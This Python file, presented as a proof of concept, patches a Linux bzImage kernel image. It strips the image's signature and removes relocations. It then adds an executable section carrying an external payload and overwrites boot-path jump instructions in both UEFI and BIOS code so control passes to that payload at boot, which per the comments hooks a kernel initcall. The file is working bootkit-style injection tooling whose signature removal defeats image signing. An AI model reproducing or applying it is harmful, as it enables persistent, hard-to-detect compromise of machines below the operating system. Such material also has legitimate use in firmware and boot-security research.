"""
PoC to patch a bzImage, only for uefi as we are hooking the the uefi functions
and rely on being able to create more sections.
"""
import sys
import math
import struct
import pefile
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT
from binsearch import FixedBytes, BinSearch
from pe import PERemoveSig, PECheckSumFix
from remove_reloc import remove_reloc


def assemble(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    ks.syntax = KS_OPT_SYNTAX_ATT
    encoding, count = ks.asm(code)
    return bytes(encoding)


def pad(data, padding=4096, before=False, value=b'\x00'):
    extra = padding - (len(data) % padding)

    if before:
        return extra * value + data

    return data + extra * value


def to_page_count(value, page_size=4096):
    return math.ceil(value / page_size)


def uefi_patch(pe_data, offset):
    # Replacing a jump, trashing some error handling code that shouldn't really
    # happen.

    # mov rsi, rbx
    # add rax, rcx
    # jmp rax
    bs = BinSearch([
        FixedBytes(b'\x48\x89\xDE'),
        FixedBytes(b'\x48\x01\xC8'),
        FixedBytes(b'\xFF\xE0')
    ])
    total = 3 + 3 + 2
    matches = bs.search(pe_data)

    assert(len(matches) == 1)

    target_jump_offset = matches[0][0]
    dist = offset - (target_jump_offset + total - 5)
    dist += 32
    # note: we need to do the instructions we replaced in the next stage!!!
    transfer = pad(
        assemble(f'jmp {hex(dist)}'),
        total, before=True, value=b'\x90'
    )
    pe_data[target_jump_offset:target_jump_offset+total] = transfer
    return pe_data


def bios_patch(pe_data, offset):
    # Patching for BIOS
    # end of startup_64
    # we include some random junk that I *think* comes from code to handle non
    # 64bit CPUs, so who cares if we trash it.
    # .Lno_longmode in the kernel tree
    # Saves us having to call extract_kernel in next stage if overwrite it,
    # as we need space to pushq and ret.
    bs = BinSearch([
        # FixedBytes(b'\x4c\x89\xfe'),
        FixedBytes(b'\xff\xe0'),
        FixedBytes(b'\xf4\xeb\xfd\x66\x0f\x1f\x44\x00\x00')
    ])
    total = 2 + 9
    matches = bs.search(pe_data)
    assert(len(matches) == 1)

    # Now we want to disable relocation so the kernel is always at its prefered
    # address with various bootloaders.
    pe_data[0x234] = 0
    # And fix the prefered address.
    pe_data[0x258:0x258 + 8] = struct.pack('<Q', 0x100_000)

    # Our takeover code.
    target_addr = 0x100_000 + offset - 0x5000

    # Jumping to an exact address
    to_patch_in = f"""
        pushq ${hex(target_addr)}
        ret
    """

    patch = assemble(to_patch_in)
    assert(len(patch) < total)

    # we'll be jumping back down to an old mapping at a fixed address.
    pe_data[matches[0][0]:matches[0][0]+total] = pad(
        patch,
        total, before=True, value=b'\x90'
    )

    return pe_data


def add_data(pe_data_orig, data):
    """
    Add a new section to store our patch in the PE, then append our data, and
    install the patches to transfer control to our payload.
    """

    to_add = pad(data, 4096)

    pe = pefile.PE(data=pe_data_orig)

    # Make the last sections raw size equal to its virtual size
    curr_virtual_size = pe.sections[-1].Misc_VirtualSize
    curr_real_size = pe.sections[-1].SizeOfRawData
    pe.sections[-1].SizeOfRawData = curr_virtual_size

    # Need some offsets for patching
    last_offset = pe.sections[-1].__file_offset__ + 0x28

    text_offset = 0
    for section in pe.sections:
        if section.Name != b'.text\x00\x00\x00':
            continue

        text_offset = section.__file_offset__
        break

    # Now we update the headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage += len(to_add)
    pe.OPTIONAL_HEADER.SizeOfCode = pe.OPTIONAL_HEADER.SizeOfImage
    pe_data = bytearray(pe.write())

    # Pad the last section
    to_pad_with = curr_virtual_size - curr_real_size
    pe_data += b'\x00' * to_pad_with

    # Now append our data
    offset = len(pe_data)
    pe_data += to_add

    # Create new section based on .text, with the same permissions.
    pe_data[last_offset:last_offset + 0x28] = \
        pe_data[text_offset:text_offset + 0x28]

    # Need to use offsets here to work around library issues.

    # name
    pe_data[last_offset:last_offset + 8] = b'.patch\x00\x00'

    # virtualSize
    pe_data[last_offset + 8:last_offset + 8 + 4] = \
        struct.pack('<I', len(to_add))
    # rva
    pe_data[last_offset + 12:last_offset + 12 + 4] = \
        struct.pack('<I', offset)
    # size of raw data
    pe_data[last_offset + 16:last_offset + 16 + 4] = \
        struct.pack('<I', len(to_add))
    # ptr raw data
    pe_data[last_offset + 20:last_offset + 20 + 4] = \
        struct.pack('<I', offset)

    # Our UEFI Patch to transfer control
    pe_data = uefi_patch(pe_data, offset)

    # Our BIOS Patch to transfer control
    pe_data = bios_patch(pe_data, offset)

    return pe_data


def main():
    a = open(sys.argv[1], 'rb').read()

    # remove the sig
    a = PERemoveSig(a).remove_sig()

    # Remove the reloc section in older kernels
    a = remove_reloc(a)

    # Adding our payload
    # this is the first stage that will patch the kernel after its been
    # decompressed, hooking an initcall and making sure our payload exists in
    # virtual memory.
    payload = open('./payload/all.bin', 'rb').read()
    a = add_data(
        a,
        pad(payload, value=b'\x00')
    )

    # Checksum fixes for sanity
    # need to fix the bzImage checksum. Nothing really checks it, but lets do
    # it for completenes.
    last = PECheckSumFix(a).fix()
    open(sys.argv[2], 'wb').write(last)


if __name__ == "__main__":
    main()
